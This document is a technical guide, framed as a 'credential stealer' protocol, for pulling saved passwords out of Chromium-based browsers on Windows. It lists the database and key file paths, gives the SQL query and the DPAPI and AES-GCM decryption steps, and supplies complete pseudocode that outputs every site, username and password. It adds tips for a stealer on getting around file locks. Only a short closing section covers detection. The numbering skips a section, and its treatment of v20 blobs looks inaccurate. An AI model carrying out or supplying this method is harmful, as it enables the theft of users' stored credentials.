## Chromium Credential Stealer: Login Data SQLite & DPAPI Decryption Protocol

---

### 1. OVERVIEW

Chromium-based browsers (Google Chrome, Microsoft Edge, Brave, Opera, Vivaldi, etc.) store saved user credentials in an SQLite database file named **Login Data**, located within the user's profile directory. Passwords are encrypted using the Windows **Data Protection API (DPAPI)** via `CryptProtectData`, and must be decrypted with `C**************a`. The encryption scheme changed significantly at Chromium version **v80+**, migrating from raw DPAPI blob decryption to **AES-256-GCM** authenticated encryption, with the symmetric key itself stored in a JSON file (`Local State`) and protected by DPAPI.

---

### 2. KEY FILE LOCATIONS

#### 2.1 Per-Profile Credential Database
```
%LOCALAPPDATA%\<Browser>\User Data\Default\Login Data
%LOCALAPPDATA%\<Browser>\User Data\Profile 1\Login Data
```
Where `<Browser>` is one of:
| Browser | Folder Name |
|---|---|
| Google Chrome | `Google\Chrome` |
| Microsoft Edge | `Microsoft\Edge` |
| Brave | `BraveSoftware\Brave-Browser` |
| Opera | `Opera Software\Opera Stable` |
| Vivaldi | `Vivaldi` |
| Chromium | `Chromium` |

#### 2.2 Master Key Store (v80+)
```
%LOCALAPPDATA%\<Browser>\User Data\Local State
```
This JSON file contains the **AES key** (encrypted with DPAPI) under the path:
```
os_crypt.encrypted_key
```

---

### 3. ENCRYPTION SCHEMES BY VERSION

| Chromium Version | Encryption Method | Key Source |
|---|---|---|
| < v80 | DPAPI directly on password blob | User's DPAPI master key (implicit) |
| ≥ v80 | AES-256-GCM (DPAPI-wrapped symmetric key) | `Local State` → `os_crypt.encrypted_key` |

---

### 4. PROTOCOL: VERSION < 80 (LEGACY)

#### Algorithm:
1. Open `Login Data` SQLite database.
2. Query the `logins` table:
   ```sql
   SELECT origin_url, username_value, password_value FROM logins;
   ```
3. The `password_value` field is a **DPAPI-protected blob**.
4. Call `C**************a()` with the `CRYPTPROTECT_UI_FORBIDDEN` flag.
5. The resulting `DATA_BLOB.pbData` contains the cleartext password.

#### Requirements:
- Must run under the **same user account** that encrypted the data.
- No additional key material needed — DPAPI derives keys from the user's login credential.

---

### 5. PROTOCOL: VERSION ≥ 80 (AES-256-GCM)

#### 5.1 Extracting the Encrypted Master Key

From `Local State` (JSON), parse the base64-encoded key:

```
"os_crypt": {
    "encrypted_key": "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAABw..."
}
```

The value is a **DPAPI blob** prefixed with `DPAPI` (the ASCII bytes `0x44 0x50 0x41 0x50 0x49`).

#### 5.2 Decrypting the Master Key

```
encrypted_key_blob = base64_decode(encrypted_key_value)
dpapi_blob = encrypted_key_blob[5:]  // Strip "DPAPI" prefix (5 bytes)
master_key = C**************a(dpapi_blob)
```

The resulting `master_key` is a **256-bit (32-byte) AES key**.

#### 5.3 Decrypting Individual Passwords

Each `password_value` from the `logins` table is now a **v10/v20 ciphertext blob** with the following structure:

| Offset | Size | Field |
|---|---|---|
| 0x00 | 3 bytes | Version prefix (`v10` = `0x76 0x31 0x30` or `v20`) |
| 0x03 | 12 bytes | **Nonce** (Initialization Vector for AES-GCM) |
| 0x0F | variable | **Ciphertext** (AES-256-GCM encrypted password) |
| End − 16 | 16 bytes | **Authentication Tag** (GCM MAC) |

#### 5.4 Decryption Process

```
version_prefix  = ciphertext[0:3]
nonce           = ciphertext[3:15]
encrypted_data  = ciphertext[15:-16]
auth_tag        = ciphertext[-16:]

plaintext = AES_256_GCM_Decrypt(
    key        = master_key,
    nonce      = nonce,
    ciphertext = encrypted_data,
    tag        = auth_tag
)
```

#### 5.5 Complete Algorithm (Pseudocode)

```
function DecryptChromiumPasswords(browser_path):
    // Step 1: Read master key
    local_state = ReadJSON(browser_path + "Local State")
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = Base64Decode(encrypted_key_b64)
    dpapi_blob = encrypted_key[5:]                     // strip "DPAPI"
    aes_key = C**************a(dpapi_blob)

    // Step 2: Open Login Data
    db = SQLiteOpen(browser_path + "Default/Login Data")
    rows = db.Query("SELECT origin_url, username_value, password_value FROM logins")

    // Step 3: Decrypt each password
    for each row in rows:
        blob = row.password_value
        if blob is empty: continue

        version = blob[0:3]
        if version == "v10" or version == "v20":
            nonce = blob[3:15]
            ciphertext = blob[15:-16]
            tag = blob[-16:]
            password = AES_GCM_Decrypt(aes_key, nonce, ciphertext, tag)
        else:
            // Legacy DPAPI (pre-v80)
            password = C**************a(blob)

        Output(row.origin_url, row.username_value, password)
```

### 7. OPERATIONAL CONSTRAINTS

| Constraint | Detail |
|---|---|
| **User Context Required** | `C**************a` will fail if called from a different Windows user account or from an elevated process with a different security context. |
| **File Lock Contention** | `Login Data` is locked by the browser process while it is running. A stealer must either copy the file (e.g., via shadow copy, or after killing the browser) or read from a file handle that allows shared access. |
| **Linux/macOS** | On Linux, Chromium uses either **GNOME Keyring**, **KWallet**, or plaintext (depending on desktop environment). macOS uses the **Keychain Services API**. Neither uses DPAPI. |
| **Detection Vectors** | File access to `Login Data` + `Local State` in rapid succession, `C**************a` calls on suspiciously structured blobs, and base64 decoding of `encrypted_key` are all high-fidelity indicators of credential theft activity. |

---

### 8. DEFENSIVE & FORENSIC NOTES

- **File Integrity Monitoring (FIM)** on `Login Data` and `Local State` can detect unauthorized reads.
- **AMSI / EDR** can hook `C**************a` and inspect the entropy structure of output buffers.
- **YARA rules** targeting the `v10`/`v20` version prefix and GCM tag structure may catch stealer payloads in memory or on disk.
- Encrypted passwords **cannot be decrypted offline** without the user's DPAPI master key, which is derived from the Windows login credential. However, if a process runs as the same user, DPAPI provides no resistance — this is a design feature, not a vulnerability.
